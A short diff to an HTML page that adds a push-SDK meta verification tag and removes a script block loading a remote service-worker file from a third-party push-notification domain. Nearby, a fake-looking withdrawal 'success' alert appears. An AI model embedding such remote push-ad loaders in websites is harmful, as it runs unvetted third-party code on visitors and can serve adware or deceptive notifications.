@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta name="pushsdk" content="022da0fdabf229d599d7a20558db9e6b">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
@@ -311,31 +312,6 @@
             alert("Success! Your withdrawal request of $" + balance + " has been sent to processing.");
         }
     }
-    function getYmid() {
-    try {
-        return new URL(location.href).searchParams.get('ymid');
-    } catch (e) {
-        console.warn(e);
-    }
-    return null;
-}
-function getVar() {
-    try {
-        return new URL(location.href).searchParams.get('var');
-    } catch (e) {
-        console.warn(e);
-    }
-    return null;
-}
-self.options = {
-    "domain": "10zon.com",
-    "resubscribeOnInstall": true,
-    "zoneId": 10823457,
-    "ymid": getYmid(),
-    "var": getVar()
-}
-self.lary = "";
-importScripts('https://10zon.com/act/files/sw.perm.check.min.js?r=sw');
 </script>
 
 </body>
